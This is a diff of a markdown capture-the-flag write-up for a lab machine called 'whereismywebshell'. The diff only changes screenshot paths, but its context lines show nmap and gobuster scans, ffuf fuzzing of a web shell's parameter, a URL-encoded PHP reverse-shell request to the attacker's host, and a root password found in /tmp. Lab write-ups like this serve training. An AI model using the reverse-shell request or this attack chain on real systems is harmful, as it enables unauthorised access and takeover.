@@ -28,7 +28,7 @@ nmap -sCV -p80 172.17.0.2
 ```
 
 **Results:**
-![Nmap](/public/content/screenshots/whereismywebshell/nmap.png)
+![Nmap](./content/screenshots/whereismywebshell/nmap.png)
 
 As we can see, only port 80 is open. When accessing via browser, we observe a simple web page. Apparently there are no inputs or forms that allow us to attempt any injection or attack. So as the next step, we enumerate directories and files on the web server.
 
@@ -39,7 +39,7 @@ As we can see, only port 80 is open. When accessing via browser, we observe a si
 gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
 ```
 
-![Gobuster](/public/content/screenshots/whereismywebshell/gobuster.png)
+![Gobuster](./content/screenshots/whereismywebshell/gobuster.png)
 
 **Findings:**
 - warning.html web page
@@ -58,7 +58,7 @@ This gives us the definitive clue that shell.php is a web shell and that it has 
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://172.17.0.2/shell.php?FUZZ=whoami -fs 0
 ```
 
-![Ffuf](/public/content/screenshots/whereismywebshell/ffuf.png)
+![Ffuf](./content/screenshots/whereismywebshell/ffuf.png)
 
 As we can see in the result, the `parameter` parameter is the one that is available.
 
@@ -84,7 +84,7 @@ http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen(%22172.1
 
 When sending the request to the server, a reverse shell connection is established and we gain access to the system as www-data user.
 
-![Reverse Shell](/public/content/screenshots/whereismywebshell/reverse_shell.png)
+![Reverse Shell](./content/screenshots/whereismywebshell/reverse_shell.png)
 
 ## 🔐 Privilege Escalation
 
@@ -97,7 +97,7 @@ After exploring the system a bit in search of interesting files, we look for `.t
 find / -name "*.txt" -type f 2>/dev/null
 ```
 
-![Find](/public/content/screenshots/whereismywebshell/find.png)
+![Find](./content/screenshots/whereismywebshell/find.png)
 
 We found a file `/tmp/.secret.txt` with the root user credentials:
 
@@ -109,7 +109,7 @@ contraseñaderoot123
 
 We simply do `su root` and enter the password.
 
-![Su Root](/public/content/screenshots/whereismywebshell/root.png)
+![Su Root](./content/screenshots/whereismywebshell/root.png)
 
 Finally, we gain access to the machine as root user 🎉
 
